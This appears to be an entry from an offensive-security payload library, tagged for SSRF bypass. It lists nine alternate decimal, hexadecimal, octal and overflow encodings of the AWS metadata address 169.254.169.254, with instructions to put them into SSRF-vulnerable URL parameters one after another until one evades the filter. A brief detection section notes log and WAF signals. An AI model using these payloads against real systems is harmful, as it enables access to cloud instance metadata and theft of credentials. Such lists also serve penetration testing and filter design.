---
type: code
language: text
verified: true
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - AWS
  - Web
tags:
  - ssrf
  - bypass
  - encoding
validated: true
---

# alternate-ip-encodings-for-aws-bypass

## Code

```text
http://425.510.425.510/ Dotted decimal with overflow
http://2852039166/ Dotless decimal
http://7147006462/ Dotless decimal with overflow
http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
http://0xA9FEA9FE/ Dotless hexadecimal
http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
http://0251.0376.0251.0376/ Dotted octal
http://0251.00376.000251.0000376/ Dotted octal with padding
http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
```

## Description

List of alternative IP address encodings for the AWS metadata IP (169.254.169.254) to bypass SSRF filters that don't normalize all formats.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | These are static payloads; substitute into SSRF parameters | http://2852039166/latest/meta-data/ |

## Usage

Insert these URLs as payloads in SSRF-vulnerable parameters (e.g., ?url=) to access metadata when direct IP is blocked. Test sequentially to find what evades the filter.

## Detection

- Log analysis for unusual IP formats in request parameters (e.g., hex/oct al in URLs).
- WAF rules matching encoded link-local IPs.
- Anomalous internal requests to metadata from app servers.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
